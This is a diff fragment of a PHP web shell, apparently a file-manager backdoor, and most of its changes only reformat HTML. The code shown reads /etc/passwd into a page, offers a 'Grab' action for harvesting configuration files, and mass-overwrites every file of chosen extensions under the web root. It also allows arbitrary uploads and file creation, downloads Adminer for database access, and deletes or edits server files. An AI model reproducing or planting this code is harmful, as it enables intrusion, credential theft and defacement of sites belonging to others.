-                        </td>
+                        <td class="info" colspan="3"><?=XN::info('lib')?></td>
                     </tr>
                 </table>
             </div>
@@ -1979,18 +1326,13 @@ function filterTable() {
             break;
 
         case 'backup':
-            if (XN::save($_POST['file'].".bak",file_get_contents($_POST['file']))) {
-                alert('failed');
-            } else {
-                alert("".basename($_POST['file'])." has been backup !");
-            }
+            if (XN::save($_POST['file'].".bak",file_get_contents($_POST['file']))){alert('failed');}
+            else {alert("".basename($_POST['file'])." has been backup !");}
             break;
         case 'adminer':
         	head('Adminer', getcwd(), 'hidden');
             if (file_exists('adminer.php')) { ?>
-                <div class="adminer">
-                    <a href="adminer.php" target="_blank">Login Adminer</a>
-                </div>
+                <div class="adminer"><a href="adminer.php" target="_blank">Login Adminer</a></div>
                 <?php } 
                 else { 
                 	if (XN::adminer('https://www.adminer.org/static/download/4.7.7/adminer-4.7.7.php','adminer.php')) { ?>
@@ -2009,15 +1351,10 @@ function filterTable() {
                 <table>
                     <form method="post">
                         <tr>
-                            <td>
-                                <textarea name="passwd"><?= include '/etc/passwd' ?></textarea>
-                            </td>
+                            <td><textarea name="passwd"><?= include '/etc/passwd' ?></textarea></td>
                         </tr>
                         <tr>
-                            <td>
-                                <input type="submit" name="grab" value="Grab">
-                                <input type="hidden" name="action" value="config">
-                            </td>
+                            <td><input type="submit" name="grab" value="Grab"><input type="hidden" name="action" value="config"></td>
                         </tr>
                     </form>
                 </table>
@@ -2027,11 +1364,8 @@ function filterTable() {
                 die(alert('Just for Linux server'));
             }
             if (isset($_POST['grab'])) {
-                if (XN::config($_POST['passwd'])) {
-                    alert("failed");
-                } else {
-                    alert("success");
-                }
+                if(XN::config($_POST['passwd'])){alert("failed");}
+                else{alert("success");}
             }
             exit();
             break;
@@ -2042,27 +1376,16 @@ function filterTable() {
                 <table>
                     <form method="post">
                         <tr>
-                            <td>
-                                <input type="text" name="dir" value="<?= $_SERVER[
-                                    'DOCUMENT_ROOT'
-                                ] ?>">
-                            </td>
+                            <td><input type="text" name="dir" value="<?= $_SERVER['DOCUMENT_ROOT'] ?>"></td>
                         </tr>
                         <tr>
-                            <td>
-                                <input type="text" name="ext[]" placeholder="ext: php html txt">
-                            </td>
+                            <td><input type="text" name="ext[]" placeholder="ext: php html txt"></td>
                         </tr>
                         <tr>
-                            <td>
-                                <textarea name="text"></textarea>
-                            </td>
+                            <td><textarea name="text"></textarea></td>
                         </tr>
                         <tr>
-                            <td>
-                                <input type="submit" name="rewrite" value="Start">
-                                <input type="hidden" name="action" value="rewrite">
-                            </td>
+                            <td><input type="submit" name="rewrite" value="Start"><input type="hidden" name="action" value="rewrite"></td>
                         </tr>
                     </form>
                 </table>
@@ -2070,12 +1393,7 @@ function filterTable() {
                     for ($i = 0; $i < count($_POST['ext']); $i++) {
                         $plod = explode(" ", $_POST['ext'][$i]);
                         foreach ($plod as $data) {
-                            if ($data) { ?>
-                            <tr>
-                                <td>
-                                    <b><?= $data ?></b>
-                                </td>
-                            </tr>
+                            if ($data) { ?><tr><td><b><?= $data ?></b></td></tr>
                             <?php XN::rewrite($_POST['dir'],$data,$_POST['text']);
                         }
                         }
@@ -2092,11 +1410,8 @@ function filterTable() {
                 for ($i = 0; $i < count($dirname); $i++) {
                     $explode = explode(' ', $dirname[$i]);
                     foreach ($explode as $value) {
-                        if (XN::addfolder($value)) {
-                            alert('failed');
-                        } else {
-                            alert("success");
-                        }
+                        if (XN::addfolder($value)){alert('failed');}
+                        else{alert("success");}
                     }
                 }
             }
@@ -2106,15 +1421,10 @@ function filterTable() {
                 <table>
                     <form method="post">
                         <tr>
-                            <td>
-                                <input type="text" name="dirname[]" placeholder="dirname">
-                            </td>
+                            <td><input type="text" name="dirname[]" placeholder="dirname"></td>
                         </tr>
                         <tr>
-                            <td>
-                                <input type="submit" name="adddir">
-                                <input type="hidden" name="action" value="adddir">
-                            </td>
+                            <td><input type="submit" name="adddir"><input type="hidden" name="action" value="adddir"></td>
                         </tr>
                     </form>
                 </table>
@@ -2133,26 +1443,17 @@ function filterTable() {
                 <table>
                     <form method="post">
                         <tr>
-                            <td>
-                                <input type="text" name="filename[]" placeholder="filename">
-                            </td>
+                            <td><input type="text" name="filename[]" placeholder="filename"></td>
                             <td style="display: none;"><a id="add_input">add</a></td>
                         </tr>
                         <tr>
-                            <td style="display: none;">
-                                <div id="output"></div>
-                            </td>
+                            <td style="display: none;"><div id="output"></div></td>
                         </tr>
                         <tr>
-                            <td>
-                                <textarea style="height:400px;" name="data" placeholder="your code"></textarea>
-                            </td>
+                            <td><textarea style="height:400px;" name="data" placeholder="your code"></textarea></td>
                         </tr>
                         <tr>
-                            <td>
-                                <input type="submit" name="addfile">
-                                <input type="hidden" name="action" value="addfile">
-                            </td>
+                            <td><input type="submit" name="addfile"><input type="hidden" name="action" value="addfile"></td>
                         </tr>
                     </form>
                 </table>
@@ -2166,12 +1467,8 @@ function filterTable() {
                 <table>
                     <form method="post" enctype="multipart/form-data">
                         <tr>
-                            <td>
-                                <input type="file" name="file[]" multiple>
-                            </td>
-                            <td>
-                                <input type="submit" name="upload">
-                            </td>
+                            <td><input type="file" name="file[]" multiple></td>
+                            <td><input type="submit" name="upload"></td>
                         </tr>
                         <input type="hidden" name="action" value="upload">
                     </form>
@@ -2184,9 +1481,7 @@ function filterTable() {
                     if (copy($_FILES['file']['tmp_name'][$i],$_FILES['file']['name'][$i])) { ?>
                         <?= $_FILES['file']['name'][$i] ?>
                     <?php } 
-                    else { 
-                    	alert('Upload failed !');
-                    }
+                    else {alert('Upload failed !');}
                 }
             }
             exit();
@@ -2212,33 +1507,19 @@ function filterTable() {
             <div class="edit">
                 <table>
                     <tr>
-                        <td>
-                            Filename
-                        </td>
+                        <td>Filename</td>
                         <td>:</td>
-                        <td>
-                            <div class="editname">
-                                <?= XN::wr(basename($_POST['file']),basename($_POST['file']),2) ?>
-                            </div>
-                        </td>
+                        <td><div class="editname"><?= XN::wr(basename($_POST['file']),basename($_POST['file']),2) ?></div></td>
                     </tr>
                     <tr>
-                        <td>
-                            Size
-                        </td>
+                        <td>Size</td>
                         <td>:</td>
-                        <td>
-                            <?= XN::size($_POST['file']) ?>
-                        </td>
+                        <td><?= XN::size($_POST['file']) ?></td>
                     </tr>
                     <tr>
-                        <td>
-                            Last Modif
-                        </td>
+                        <td> Last Modif</td>
                         <td>:</td>
-                        <td>
-                            <?= XN::ftime($_POST['file']) ?>
-                        </td>
+                        <td><?= XN::ftime($_POST['file']) ?></td>
                     </tr>
                     <tr>
                         <form method="post">
@@ -2260,9 +1541,7 @@ function filterTable() {
                         <tr>
                             <td colspan="3">
                                 <input type="submit" name="save" value="SAVE">
-                                <input type="hidden" name="file" value="<?= $_POST[
-                                    'file'
-                                ] ?>">
+                                <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
                                 <input type="hidden" name="action" value="edit">
                             </td>
                         </tr>
@@ -2307,34 +1586,17 @@ function filterTable() {
     <div class="table">
     <table id="myTable">
         <?php
-        if (!XN::countDir(getcwd())) { ?>
-        	<div class="nothing">
-        		Not files in here
-        	</div>
-        <?php }
+        if (!XN::countDir(getcwd())){?><div class="nothing">Not files in here</div>
+    	<?php }
         foreach (XN::files('dir') as $dir) { ?>
             <tr>
                 <td class="border1 hover">
                     <div class="block">
                         <a href="?x=<?= $dir['name'] ?>" title="<?= $dir['names'] ?>">
-                            <div class="img">
-                                <img src="https://image.flaticon.com/icons/svg/715/715676.svg">
-                            </div>
-                            <div class="name">
-                                <?= $dir['names'] ?>
-                                <div class="date">
-                                    <div class="dir-size">
-                                        <?= $dir['size'] ?>
-                                    </div>
-                                    <div class="dir-perms">
-                                        <?= XN::wr($dir['name'],XN::perms($dir['name']),2) ?>
-                                    </div>
-                                    <div class="dir-time">
-                                        <?= $dir['ftime'] ?>
-                                    </div>
-                                    <div class="dir-owner">
-                                        <?= $dir['owner'] ?>
-                                    </div>
+                            <div class="img"><img src="https://image.flaticon.com/icons/svg/715/715676.svg"></div>
+                            <div class="name"><?= $dir['names'] ?>
+                                <div class="date"><div class="dir-size"><?= $dir['size'] ?></div><div class="dir-perms"><?= XN::wr($dir['name'],XN::perms($dir['name']),2) ?></div><div class="dir-time"><?= $dir['ftime'] ?></div>
+                                    <div class="dir-owner"><?= $dir['owner'] ?></div>
                                 </div>
                             </div>
                         </a>
@@ -2342,37 +1604,22 @@ function filterTable() {
                 </td>
                 <td class="border2">
                     <nav>
-                        <a class="dropdown-toggle" title="Menu">
-                            <span style="color: #787878;">
-                                <i class="fa fa-ellipsis-v" aria-hidden="true"></i>
-                            </span>
-                        </a>
+                        <a class="dropdown-toggle" title="Menu"><span style="color: #787878;"><i class="fa fa-ellipsis-v" aria-hidden="true"></i></span></a>
                         <ul class="dropdown">
                             <form method="post" action="?x=<?= getcwd() ?>">
-                                <li>
-                                    <button name="action" value="delete">Delete</button>
-                                </li>
-                                <li>
-                                    <a href="#rename<?= XN::replace($dir['names']) ?>" rel="modal:open">Rename</a>
-                                </li>
+                                <li><button name="action" value="delete">Delete</button></li>
+                                <li><a href="#rename<?= XN::replace($dir['names']) ?>" rel="modal:open">Rename</a></li>
                                 <input type="hidden" name="file" value="<?= $dir['name'] ?>">
                             </form>
                         </ul>
                     </nav>
-                    <!-- Action Rename -->
                     <div id="rename<?= XN::replace($dir['names']) ?>" class="modal modal-rename">
                         <div class="rename">
                             <h2>Rename</h2>
                             <form method="post" action="?x=<?= getcwd() ?>">
-                                <div>
-                                    <input type="text" name="newname" value="<?= $dir['names'] ?>">
-                                </div>
-                                <div>
-                                    <button name="action" value="rename">Rename</button>
-                                </div>
-                                <input type="hidden" name="file" value="<?= $dir[
-                                    'name'
-                                ] ?>">
+                                <div><input type="text" name="newname" value="<?= $dir['names'] ?>"></div>
+                                <div><button name="action" value="rename">Rename</button></div>
+                                <input type="hidden" name="file" value="<?=$dir['name']?>">
                             </form>
                         </div>
                     </div>
@@ -2384,24 +1631,9 @@ function filterTable() {
                 <td class="border1 hover">
                     <div class="block">
                         <a title="<?= $file['names'] ?>">
-                            <div class="img">
-                                <img src="<?= XN::geticon($file['name']) ?>">
-                            </div>
-                            <div class="name">
-                                <?= $file['names'] ?>
-                                <div class="date">
-                                    <div class="file-size">
-                                        <?= $file['size'] ?>
-                                    </div>
-                                    <div class="file-perms">
-                                        <?= XN::wr($file['name'],XN::perms($file['name']),2) ?>
-                                    </div>
-                                    <div class="file-time">
-                                        <?= $file['ftime'] ?>
-                                    </div>
-                                    <div class="file-owner">
-                                        <?= $file['owner'] ?>
-                                    </div>
+                            <div class="img"><img src="<?= XN::geticon($file['name']) ?>"></div>
+                            <div class="name"><?= $file['names'] ?>
+                                <div class="date"><div class="file-size"><?= $file['size'] ?></div><div class="file-perms"><?= XN::wr($file['name'],XN::perms($file['name']),2) ?></div><div class="file-time"><?= $file['ftime'] ?></div><div class="file-owner"><?= $file['owner'] ?></div>
                                 </div>
                             </div>
                         </a>
@@ -2410,9 +1642,7 @@ function filterTable() {
                 <td class="border2">
                     <nav>
                         <a class="dropdown-toggle" title="Menu">
-                            <span style="color: #787878;">
-                                <i class="fa fa-ellipsis-v" aria-hidden="true"></i>
-                            </span>
+                            <span style="color: #787878;"><i class="fa fa-ellipsis-v" aria-hidden="true"></i></span>
                         </a>
                         <ul class="dropdown">
                             <form method="post" action="?x=<?= getcwd() ?>">
@@ -2422,12 +1652,8 @@ function filterTable() {
                                     case 'mp4':
                                     case 'mp3':
                                         switch (XN::getext($file['name'])) {
-                                            case 'mp3':
-                                                $result = str_replace('mp3','Audio',XN::getext($file['name']));
-                                                break;
-                                            case 'mp4':
-                                                $result = str_replace('mp4','Video',XN::getext($file['name']));
-                                                break;
+                                            case 'mp3':$result = str_replace('mp3','Audio',XN::getext($file['name']));break;
+                                            case 'mp4':$result = str_replace('mp4','Video',XN::getext($file['name']));break;
                                         } ?>
                                         <li>
                                             <a href="#ex1<?= $rep ?>" rel="modal:open">Play</a>
@@ -2437,24 +1663,15 @@ function filterTable() {
                                                 </<?= $result ?>>
                                             </div>
                                         </li>
-                                        <li>
-                                            <button name="action" value="delete">Delete</button>
-                                        </li>
-                                        <li>
-                                            <a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a>
-                                        </li>
+                                        <li><button name="action" value="delete">Delete</button></li>
+                                        <li><a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a></li>
                                         <?php break;
                                     case 'zip': ?>
-                                        <li>
-                                            <button>Unzip</button>
-                                        </li>
-                                        <li>
-                                            <button name="action" value="delete">Delete</button>
-                                        </li>
-                                        <li>
-                                            <a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a>
-                                        </li>
-                                        <?php break;case 'jpg':
+                                        <li><button>Unzip</button></li>
+                                        <li><button name="action" value="delete">Delete</button></li>
+                                        <li><a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a></li>
+                                        <?php break;
+                                    case 'jpg':
                                     case 'png':
                                     case 'gif':
                                     case 'jpeg':
@@ -2466,42 +1683,25 @@ function filterTable() {
                                                 <img src="<?= str_replace($_SERVER['DOCUMENT_ROOT'],'',$file['name']) ?>">
                                             </div>
                                         </li>
-                                        <li>
-                                            <button name="action" value="delete">Delete</button>
-                                        </li>
-                                        <li>
-                                            <a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a>
-                                        </li>
+                                        <li><button name="action" value="delete">Delete</button></li>
+                                        <li><a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a></li>
                                         <?php break;default: ?>
-                                        <li>
-                                            <button name="action" value="edit">Edit</button>
-                                        </li>
-                                        <li>
-                                            <button name="action" value="delete">Delete</button>
-                                        </li>
-                                        <li>
-                                            <a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a>
-                                        </li>
-                                        <li>
-                                            <button name="action" value="backup">Backup</button>
-                                        </li>
+                                        <li><button name="action" value="edit">Edit</button></li>
+                                        <li><button name="action" value="delete">Delete</button></li>
+                                        <li><a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a></li>
+                                        <li><button name="action" value="backup">Backup</button></li>
                                         <?php break;}
                                 ?>
                                 <input type="hidden" name="file" value="<?= $file['name'] ?>">
                             </form>
                         </ul>
                     </nav>
-                    <!-- Action Rename -->
                     <div id="rename<?= XN::replace($file['names']) ?>" class="modal modal-rename">
                         <div class="rename">
                             <h2>Rename</h2>
                             <form method="post" action="?x=<?= getcwd() ?>">
-                                <div>
-                                    <input type="text" name="newname" value="<?= $file['names'] ?>">
-                                </div>
-                                <div>
-                                    <button name="action" value="rename">Rename</button>
-                                </div>
+                                <div><input type="text" name="newname" value="<?= $file['names'] ?>"></div>
+                                <div><button name="action" value="rename">Rename</button></div>
                                 <input type="hidden" name="file" value="<?= $file['name'] ?>">
                             </form>
                         </div>
